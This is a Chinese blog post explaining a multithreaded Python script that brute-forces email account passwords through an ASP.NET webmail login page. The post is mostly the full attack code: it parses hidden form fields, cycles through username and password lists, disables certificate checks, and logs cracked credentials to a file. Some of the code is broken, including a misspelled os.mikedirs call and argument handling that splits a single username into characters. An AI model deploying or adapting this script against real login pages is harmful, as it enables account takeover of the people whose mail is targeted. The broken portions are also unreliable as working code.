---
title: 多线程爆破脚本(python3)
date: 2017-06-27 09:05:31
tags: Python
---
>   起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。

## 主要功能
脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 

关于这个库的使用，可以参考我之前写过的blog：[Python argparse模块详解](http://oddboy.cn/2017/06/Python-argparse模块详解/)

```
➜  pythonCode python3 BingoBF.py -h
        .--.
       |o_o |    ------------------
       |:_/ |   < Author: Mr.Bingo >
      //   \ \   ------------------
     (|     | ) <    oddboy.cn     >
    /'\_   _/`\  ------------------
    \___)=(___/

usage: BingoBF [options]

Brute Force 【https://mail.xxx.com] email's passwords.

optional arguments:
  -h, --help   show this help message and exit
  -u USERNAME  username
  -U USERLIST  usernames
  -p PASSWORD  password
  -P PWDLIST   passwords
  -o OUTPUT    print results to file
  -t THREAD    mutli threads, default 3 threads

+---+
```
<!-- more -->
## 代码解释
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import argparse
import queue
import requests
import threading
import os
import time
import random
from html.parser import HTMLParser
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# disable InsecureRequestWarning
# 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：
# https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho

logging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）

# general settings

target_url="https://mail.xxx.com/UserLogin.aspx"

writeFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。
threadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。

# 保存爆破结果
def saveFile(message,outfilePath):
    with open(outfilePath, 'a+', encoding = 'utf8') as f:  # 以追加的方法结果写入文件
        f.write(message[0]+"\t")
        f.write(message[1]+"\n")

# 自定义一个Exception类,用于显示自定义的异常。
class validcodeException(BaseException):
    def __init__(self,mesg=" @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!"):
        print(mesg)

# 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if (tag_name == "__VIEWSTATE") or (tag_name == "__VIEWSTATEGENERATOR") or (tag_name == "__EVENTVALIDATION"):
                self.tag_results[tag_name] = tag_value

# 核心实现类
class Bruter(object):
    def __init__(self, threads,userList,pwdList,outfilePath):
        self.user_q=userList
        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。
        self.threads=threads
        self.outfilePath=outfilePath
        print("Total %d(%d * %d) tries( %d threads)"% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))

    # 线程的创建与管理
    def run_bruteforce(self):
        thread_arr=[]       # 线程列表list
        for i in range(self.threads):
            t = threading.Thread(target=self.web_bruter)
            thread_arr.append(t)            # 创建线程
        for i in range(self.threads):
            thread_arr[i].start()           # 开启线程
        for i in range(self.threads):
            thread_arr[i].join()            # 回归线程

    # 核心方法
    def web_bruter(self):
        proxies = { 
            "http": "http://127.0.0.1:8080", 
            "https": "https://127.0.0.1:8080", 
        }       # Burpsuite的代理地址

        # 初始化cookie以及hidden元素数据。
        response = requests.get(target_url,proxies=proxies,verify=False)
        cookie=response.cookies

        # 解析异常表单字段
        parser = BruteParser()
        parser.feed(response.text)
        post_tags = parser.tag_results
        post_tags['cmdSubmit.x']=random.randint(1,47)       # 登录按钮图片 47x39像素
        post_tags['cmdSubmit.y']=random.randint(1,39)

        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。
        while not self.user_q.empty():
            username = self.user_q.get().rstrip().decode("ascii")
            for password in self.pwdlist:
                password=password.decode("ascii")
                post_tags["txtUsername"]=username
                post_tags["txtPassword"]=password
                
                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。
                # \r将光标回退到行首（\b回退一格）,实现原地覆盖。
                print(" \b\b"*100,end="")       # 退两格，清空一格。 实现清空。
                print("\rTrying: %15s : %15s  (%d users left)" % (username,password, self.user_q.qsize()),end="")
                #time.sleep(2)          # 调试时使用的
                threadLock.release()    # 释放线程锁
                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)

                if ("欢迎使用XXX邮件系统" in reqResult.text):   # 爆破成功
                    threadLock.acquire()    # 取得线程锁
                    print(" \b\b"*100,end="")
                    print ("\r[*] -->  %15s\t%15s" % (username,password))   # 打印到窗口
                    #time.sleep(2)
                    threadLock.release()    # 释放线程锁
                    if self.outfilePath is not None:    # 输出到文件
                        # 获取文件锁
                        writeFileLock.acquire()
                        try:
                            # 追加到文件
                            saveFile((username,password),self.outfilePath)
                        finally:
                            # 释放锁
                            writeFileLock.release()
                    break   # 跳出当前循环，进行下一个用户名爆破
                if ("您输入的验证码不正确，请重新输入!" in reqResult.text): # 验证码错误，抛出异常！
                    raise validcodeException("验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆")
                    exit    # 退出！ 理论上不会执行这一句。
                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。

                if  ("对不起, 您输入的用户名或口令错误, 请重新输入。" in reqResult.text):
                    pass        # 占一个坑，没鸟用
                pass

                #time.sleep(2)
# 读取文件，生成队列
def build_list(listFile):   
    # read in the list file
    fd = open(listFile, "rb")
    raw_words = fd.readlines()
    fd.close()

    words = queue.Queue()

    for word in raw_words:
        word = word.rstrip()
        words.put(word)
    return words


def main():
    headCharPic="\r        .--.\n       |o_o |    ------------------ \n       |:_/ |   < Author: Mr.Bingo >\n      //   \ \   ------------------ \n     (|     | ) <    oddboy.cn     >\n    /'\_   _/`\  ------------------\n    \___)=(___/\n"
    print(headCharPic)
    # 创建一个argparser解析器
    parser=argparse.ArgumentParser(
        prog="BingoBF",
        usage=" %(prog)s [options] ",
        description='Brute Force 【https://mail.xxx.com] email\'s passwords.',
        epilog="+---+\n"
        )

    groupUser = parser.add_mutually_exclusive_group(required=True)
    groupUser.add_argument('-u',dest="username",help="username")
    groupUser.add_argument('-U',dest='userList',help="usernames")

    groupPwd = parser.add_mutually_exclusive_group(required=True)
    groupPwd.add_argument('-p',dest="password",help="password")
    groupPwd.add_argument('-P',dest='pwdList',help="passwords")

    parser.add_argument('-o',dest='output',help="print results to file")

    parser.add_argument("-t",dest="thread",type=int,help="mutli threads, default 3 threads",default=3)

    args=parser.parse_args()    # 命令行参数解析
    
    if args.username is not None:
        userList=list(args.username)
    else:
        userList = build_list(args.userList)
    if args.password is not None:
        pwdList=list(args.password)
    else:
        pwdList = build_list(args.pwdList)

    outfilePath = None
    if args.output is not None:
        outfilePath = args.output
        filePath,fileName=os.path.split(outfilePath)
        if (filePath!="") and (not os.path.exists(filePath)):
            os.mikedirs(filePath)   # 若不存在这个目录则递归创建

    if args.thread is not None:
        user_thread=args.thread

    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)
    bruter_obj.run_bruteforce()

if __name__ == '__main__':
    main()
```
## 调用sample
```
➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt
```

## 附赠
命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。